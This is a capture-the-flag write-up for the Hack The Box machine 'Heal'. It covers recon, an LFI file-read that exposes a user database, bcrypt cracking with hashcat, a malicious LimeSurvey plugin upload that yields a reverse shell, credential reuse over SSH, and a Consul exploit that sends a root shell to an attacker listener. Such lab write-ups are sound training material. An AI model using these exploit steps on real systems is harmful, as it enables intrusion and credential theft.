#### by [t2p](https://app.hackthebox.com/profile/1064515)

## <span style="color: red; font-weight: bold;">Recon</span>
### <span style="color: #3498eb;">nmap</span>

`nmap` finds two open TCP ports ssh(22) and http(80)

```zsh
❯ sudo nmap -sCV -T 4 --min-rate 3000 -oA heal 10.10.11.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 02:30 EST
Nmap scan report for 10.10.11.46
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds

```
### <span style="color: #3498eb;">Website TCP 80</span>

Add to `/etc/hosts` file

```zsh
❯ echo 10.10.11.46 heal.htb | sudo tee -a /etc/hosts
10.10.11.46 heal.htb
```

#### <span style="color: #ebe134;">Site</span>

`Heal` is perhaps best envisioned as a tool for people who need to create or manage professional resumes.

![Heal/images/1.png](Heal/images/1.png)

#### <span style="color: #ebe134;">Subs</span>

After creating an account and walking around, I found: `http://take-survey.heal.htb`
Using `ffuf` found `http://api.heal.htb`

```zsh
❯ ffuf -c -u http://heal.htb -H "Host: FUZZ.heal.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://heal.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 262ms]
:: Progress: [100000/100000] :: Job [1/1] :: 170 req/sec :: Duration: [0:10:14] :: Errors: 0 ::

```

Go to `http://api.heal.htb`

![Heal/images/2.png](Heal/images/2.png)

Access via page redirect after login `http://take-survey.heal.htb/index.php/552933?lang=en`

![10.png](Heal/images/10.png)

I then found a login page when I appended `/admin` to the end of the path and was redirected to:
`http://take-survey.heal.htb/index.php/admin/authentication/sa/login`

```zsh
❯ curl -vv http://take-survey.heal.htb/index.php/admin
00:42:27.449516 [0-0] * Host take-survey.heal.htb:80 was resolved.
00:42:27.449583 [0-0] * IPv6: (none)
00:42:27.449605 [0-0] * IPv4: 10.10.11.46
00:42:27.449629 [0-0] * [SETUP] added
00:42:27.449670 [0-0] *   Trying 10.10.11.46:80...
00:42:27.711294 [0-0] * Connected to take-survey.heal.htb (10.10.11.46) port 80
00:42:27.711346 [0-0] * using HTTP/1.x
00:42:27.711420 [0-0] > GET /index.php/admin HTTP/1.1
00:42:27.711420 [0-0] > Host: take-survey.heal.htb
00:42:27.711420 [0-0] > User-Agent: curl/8.11.1
00:42:27.711420 [0-0] > Accept: */*
00:42:27.711420 [0-0] > 
00:42:27.711717 [0-0] * Request completely sent off
00:42:28.008894 [0-0] < HTTP/1.1 302 Found
00:42:28.008969 [0-0] < Server: nginx/1.18.0 (Ubuntu)
00:42:28.008993 [0-0] < Date: Sat, 21 Dec 2024 05:42:25 GMT
00:42:28.009048 [0-0] < Content-Type: text/html; charset=UTF-8
00:42:28.009110 [0-0] < Transfer-Encoding: chunked
00:42:28.009159 [0-0] < Connection: keep-alive
00:42:28.009254 [0-0] < Set-Cookie: LS-ZNIDJBOXUNKXWTIP=9le6q03cj161fpk9a3b0ttb29n; path=/; HttpOnly
00:42:28.009324 [0-0] < Expires: Thu, 19 Nov 1981 08:52:00 GMT
00:42:28.009411 [0-0] < Cache-Control: no-store, no-cache, must-revalidate
00:42:28.009492 [0-0] < Pragma: no-cache
00:42:28.009554 [0-0] < Location: http://take-survey.heal.htb/index.php/admin/authentication/sa/login
00:42:28.009593 [0-0] < 
00:42:28.009664 [0-0] * Connection #0 to host take-survey.heal.htb left intact
```

![[11.png]]

It doesn't seem exploitable at first, we'll note them later.

## <span style="color: red; font-weight: bold;">Shell as</span> **`www-data`**
### <span style="color: #3498eb;">LFI found</span>

When you export the `.pdf` file and check the progress on `Burpsuite` you will see this:

![Heal/images/4.png](Heal/images/4.png)

I'll try downloading `/etc/passwd` to see if LFI actually exists here.

![Heal/images/5.png](Heal/images/5.png)

And **BUMP!** I saw the contents of `/etc/passwd`

![Heal/images/6.png](Heal/images/6.png)

```zsh
❯ cat heal_passwd | grep -v "nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
pollinate:x:105:1::/var/cache/pollinate:/bin/false
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Pay attention to user `ron`, next we will search for information through LFI to see if there is anything.

### <span style="color: #3498eb;">Get the password</span>

`ChatGPT` is useful now to quickly get the `Rails` directory structure, we know this already because we visited `api.heal.htb` earlier

![8.png](Heal/images/8.png)

I found its correct home directory.

![7.png](Heal/images/7.png)

Suggestions from `ChatGPT`

![9.png](Heal/images/9.png)

In `config/database.yml` I found: `database: storage/development.sqlite3`, it was a mess and finally this is the result:

```zsh
❯ sqlite3 heal.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  token_blacklists    
schema_migrations     users               
sqlite> select * from users;
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|11@11.11|$2a$12$4M26GREHhkPjFZqNbV1aqemhYeiEoO1xwBPW.iRSbgJxhmnp/k3Nu|2024-12-20 15:43:49.319920|2024-12-20 15:43:49.319920|11|11|0
3|test@test.test|$2a$12$omhxCyWvynOeh7RSgJaKUO7h024ZSDUDqSEzsgZ5LVrfTKdR.qu/q|2024-12-20 17:16:06.120235|2024-12-20 17:16:06.120235|test|test|0
4|atreus@atreus.com|$2a$12$Idm2JFSmNqYXYYE1.k5ggeWei49QzfDiFG/laob7Tj3XrpvRxhm4m|2024-12-20 20:06:54.081985|2024-12-20 20:06:54.081985|atreus|atreus|0
5|t2p@heal.htb|$2a$12$cbowyND08zm9pX4dx/.wV.8kuaWdYq5Hlh8CYukYXT3g1kW4Q4eM2|2024-12-21 01:38:11.749980|2024-12-21 01:38:11.749980|t2pp2p|t2pp2p|0
6|gyatt@sigma.com|$2a$12$6ggdfoDj.aMXowY7pO3GjelmpY4iAw83YEawDkxljxhNDWUZRVwwO|2024-12-21 02:14:35.255985|2024-12-21 02:14:35.255985|skbi|e|0
7|e@e.e|$2a$12$j0OQu4I1bgOfBR8744SCnOvcs8o.UCjiVHVPEwjI2n.rfw1.jjiVu|2024-12-21 02:47:04.187889|2024-12-21 02:47:04.187889|e|r|0
```

It handles the admin user's password, but at a glance we can immediately recognize it as `bcrypt`.

```zsh
❯ cat hash | xargs -n 1 hashid

Analyzing '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```
```zsh
❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --show
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

I tried ssh with user `ron` but it failed. So now I'll go back to the previous login page where we found `ralph:147258369`.

![12.png](Heal/images/12.png)

### <span style="color: #3498eb;">Foot hold</span>

I found the exploit documentation for [LimeSurvey Community Edition Version 6.6.4][https://community.limesurvey.org/]
+ https://ine.com/blog/cve-2021-44967-limesurvey-rce
+ https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

First create a `config.xml` file and change its version to 6.6.4

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>rev</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>6.6.4</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>  
        <version>6.6.4</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

And a file to get the reverse shell, you can customize it.

![16.png](Heal/images/16.png)

```zsh
❯ ll
total 12
-rw-rw-r-- 1 kali kali  779 Dec 21 01:21 config.xml
-rwxr-xr-x 1 kali kali 5493 Dec 21 01:15 rev.php

❯ 7z a rev.zip config.xml rev.php

```

Go to `http://take-survey.heal.htb/index.php/admin/pluginmanager/sa/index` upload and install the `rev.zip` file.

![13.png](Heal/images/13.png)

The other side:

```zsh
❯ curl http://take-survey.heal.htb/upload/plugins/rev/rev.php
```

And we get the shell of `www-data`.

```zsh
❯ rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.11.46] 40128
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 06:31:02 up 14:49,  1 user,  load average: 0.04, 0.03, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ron      pts/3    10.10.14.66      04:51   29.00s  0.52s  0.05s /bin/bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## <span style="color: red; font-weight: bold;">Shell as root</span>

### <span style="color: #3498eb;">Shell as </span>`ron`

Digging around in the `Lime Survey` directory for a while, I found this in `/var/www/limesurvey/application/config/config.php`

```php
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),
```

```zsh
❯ ssh ron@heal.htb
ron@heal.htb's password: AdmiDi0_pA$$w0rd

ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
```

### <span style="color: #3498eb;">TCP 8500 </span>

Checking around, I found something interesting on port 8500.

```zsh
ron@heal:~$ ss -tlnp
ron@heal:~$ curl 127.0.0.1:3001
ron@heal:~$ curl 127.0.0.1:8302
curl: (1) Received HTTP/0.9 when not allowed
ron@heal:~$ curl 127.0.0.1:8300
curl: (56) Recv failure: Connection reset by peer
ron@heal:~$ curl 127.0.0.1:8301
curl: (1) Received HTTP/0.9 when not allowed
ron@heal:~$ curl 127.0.0.1:8503
curl: (52) Empty reply from server
ron@heal:~$ curl 127.0.0.1:8500
<a href="/ui/">Moved Permanently</a>.

ron@heal:~$ curl 127.0.0.1:8600
curl: (52) Empty reply from server
ron@heal:~$ curl 127.0.0.1:5432
curl: (52) Empty reply from server
```

Forward it to my machine:

```zsh
❯ ssh -L 8500:localhost:8500 ron@heal.htb
```

Check to see if there is anything exploitable. Found that this is `Consul v1.19.2`

![14.png](Heal/images/14.png)

### <span style="color: #3498eb;">Exploit </span>

After some searching, this exploit is still available in version 1.19.2.
`https://www.exploit-db.com/exploits/51117`
 ```zsh 
python3 exploit.py <rhost> <rport> <lhost> <lport> <acl_token>
```

```zsh
❯ python3 exploit.py 127.0.0.1 8500 10.10.14.56 9981 0

[+] Request sent successfully, check your listener

```

Shell as root:
```zsh
└─$ rlwrap nc -lnvp 9981
listening on [any] 9981 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.11.46] 36274
bash: cannot set terminal process group (2231): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

![15.png](Heal/images/15.png)
